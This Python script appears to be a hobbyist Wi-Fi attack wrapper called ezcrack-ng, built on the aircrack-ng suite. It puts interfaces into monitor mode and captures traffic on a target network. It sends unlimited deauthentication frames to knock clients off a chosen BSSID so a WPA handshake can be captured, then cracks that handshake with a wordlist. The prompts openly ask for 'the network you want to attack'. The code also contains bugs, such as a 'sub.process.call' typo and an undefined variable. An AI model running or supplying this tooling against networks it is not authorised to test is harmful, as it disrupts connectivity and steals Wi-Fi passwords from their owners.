#!/usr/bin/env python3
#v1.0

import os 
import subprocess
from termcolor import colored



os.system("clear")


print(colored("                              _                     ","blue"))
print(colored("   ___ _______ _ __ __ _  ___| | __     _ __   __ _ ","blue"))
print(colored("  / _ \_  / __| '__/ _` |/ __| |/ /____| '_ \ / _` |","blue"))
print(colored(" |  __// / (__| | | (_| | (__|   <_____| | | | (_| |","blue"))
print(colored("  \___/___\___|_|  \__,_|\___|_|\_\    |_| |_|\__, |","blue"))
print(colored("    coded by .:. @authdesec .:.   v1.0        |___/ ","blue"))
print(colored("-----------------------------------------------------","blue"))
print(colored('[01]','white'), colored('start monitor mode','blue'))
print(colored('[02]','white'), colored('view your interfaces','blue'))
print(colored('[03]','white'), colored('monitor a network','blue'))
print(colored('[04]','white'), colored('obtain a wpa handshake[DeAuth tool]','blue'))
print(colored('[05]','white'), colored('stop monitor mode','blue'))
print(colored('[06]','white'), colored('crack wpa handshake/hash','blue'))
print('')

#userinput
choice = input(colored("[*] Choose an option: ","white"))


#mon a network
if(choice == "3"):
   bssid = input(colored("[*] enter the bssid: ","blue"))   
   channel = input(colored("[*] enter channel: ","blue"))
   write = input(colored("[*] enter where would you like to store the wpa handshake: ","blue"))
   iface = input(colored("[*] enter your interface: ","blue"))
   subprocess.call(["airodump-ng", "--bssid", bssid, "--channel", channel, "--write", write, iface,])


#handshake cracker
if(choice == "6"):
  os.system("clear")
  print(colored("╔═╗╔═╗┌─┐┬─┐┌─┐┌─┐┬┌─   ┌┐┌┌─┐  ┬ ┬┌─┐┌─┐┬ ┬  ┌─┐┬─┐┌─┐┌─┐┬┌─┌─┐┬─┐","blue"))
  print(colored("║╣ ╔═╝│  ├┬┘├─┤│  ├┴┐───││││ ┬  ├─┤├─┤└─┐├─┤  │  ├┬┘├─┤│  ├┴┐├┤ ├┬┘","blue"))
  print(colored("╚═╝╚═╝└─┘┴└─┴ ┴└─┘┴ ┴   ┘└┘└─┘  ┴ ┴┴ ┴└─┘┴ ┴  └─┘┴└─┴ ┴└─┘┴ ┴└─┘┴└─","blue"))
  print(colored("--------------------------------------------------------------------","white"))
  print("")
  hashfile = input(colored("[*] Enter path to handshake file: ","blue"))
  wordlist = input(colored("[*] Enter path to word list: ","blue"))
  subprocess.call(['aircrack-ng', hashfile, '-w', wordlist,])
                                          
#stop mon mode
if(choice == "5"):
   os.system("airmon-ng stop wlan0mon")
   os.system("airmon-ng stop wlan1mon")
   os.system("airmon-ng stop wlan2mon")

#view interfaces
if(choice == "2"): 
  subprocess.call(['ifconfig',])


#deauth tool
if(choice == "4"):
   os.system("clear")
   print(colored(' ######            #                              #                                    ','red'))                                     
   print(colored(' #     # ######   # #   #    # ##### #    #      # #   ##### #####   ##    ####  #    #','red')) 
   print(colored(' #     # #       #   #  #    #   #   #    #     #   #    #     #    #  #  #    # #   # ','red')) 
   print(colored(' #     # #####  #     # #    #   #   ######    #     #   #     #   #    # #      ####  ','red')) 
   print(colored(' #     # #      ####### #    #   #   #    #    #######   #     #   ###### #      #  #  ','red')) 
   print(colored(' #     # #      #     # #    #   #   #    #    #     #   #     #   #    # #    # #   # ','red')) 
   print(colored(' ######  ###### #     #  ####    #   #    #    #     #   #     #   #    #  ####  #    #','red'))
   print(colored('-----------------------------------------------------------------------------------------','white'))
   bssid2 = input(colored("enter the bssid of the network you want to attack: ","red"))
   iface2 = input(colored("enter your interface: ","red"))
   subprocess.call(['aireplay-ng', '--deauth', '0', '-a', bssid2, iface2,])


#set iface


if(choice == "1"):
   interface = input(colored("[*] Choose an interface: ","blue"))
if(interface == "wlan0"):
   subprocess.call(['airmon-ng', 'start', 'wlan0',])
elif(interface == "wlan1"):
   sub.process.call(['airmon-ng', 'start', 'wlan1',])  
else:
   print(colored("[*] " + interface + " is not an interface [*]","red"))

if(interface == "wlan0"):
   subprocess.call(['airodump-ng', 'wlan0mon',])
elif(interface == "wlan1"):
   subprocess.call(['airodump-ng', 'wlan1mon',])
elif(interface == "wlan2"):
   subprocess.call(['airodump-ng', 'wlan2mon',])




